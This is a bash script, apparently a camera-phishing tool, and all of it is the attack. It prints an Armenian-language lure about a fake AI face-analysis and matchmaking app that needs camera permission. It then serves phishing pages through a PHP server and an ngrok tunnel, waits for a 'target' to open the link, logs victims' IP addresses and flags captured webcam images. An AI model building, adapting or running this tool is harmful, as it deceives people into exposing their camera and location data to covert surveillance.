#!/bin/bash
printf "<<
 NGROK Organization նորաբաց հայկական IT կազմակերպությունը, որը տվյալ տարածաշրջանում առաջիններից է արհեստական բանականության ոլորտում, մասնակցում է 4-րդ միջազգային "Թեքնովեյշն" IT մրցույթին:
 Առաջարկում ենք գնահատել մեր ծրագիրը, որը աշխատում է բոլոր պլատֆորմաների վրա (ios, android,  windows և այլն): 
 Ծրագիրը կարողանում է.
 •ճանաչել սեռը և տարիքը ըստ դիմային համամասնությունների
 •համապատասխան ալգորիթմի օգնությամբ գտնել Ձեզ համապատասխան մարդուն Ձեր իսկ տարածաշրջանից:
 Ծրագրի աշխատանքի համար պետք է թույլ տալ տեսախցիկի օգտագործումը:
 հ.գ. Էջը գտնվում է պատրաստման շրջանում, այդ պատճառով հղումը ունի այսպիսի տեսք
>>
"
stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}
catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
cat ip.txt >> saved.ip.txt
}
checkfound() {
printf "\n"
printf "waiting\n"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "target opened the link\n"
catch_ip
rm -rf ip.txt
fi
sleep 0.5
if [[ -e "Log.log" ]]; then
printf "cam\n"
rm -rf Log.log
fi
sleep 0.5
done 
}
payload_ngrok() {
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
sed 's+forwarding_link+'$link'+g' getphoto.html > index2.html
sed 's+forwarding_link+'$link'+g' template.php > index.php
}
ngrok_server() {
printf "starting php\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
sleep 2
printf "starting ngrok\n"
./ngrok http 3333 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "link:"$link
payload_ngrok
checkfound
}
start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
ngrok_server
sleep 1
clear
start1
}
payload() {
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
sed 's+forwarding_link+'$send_link'+g' template.php > index.php
}
start() {
payload
checkfound
}
start1
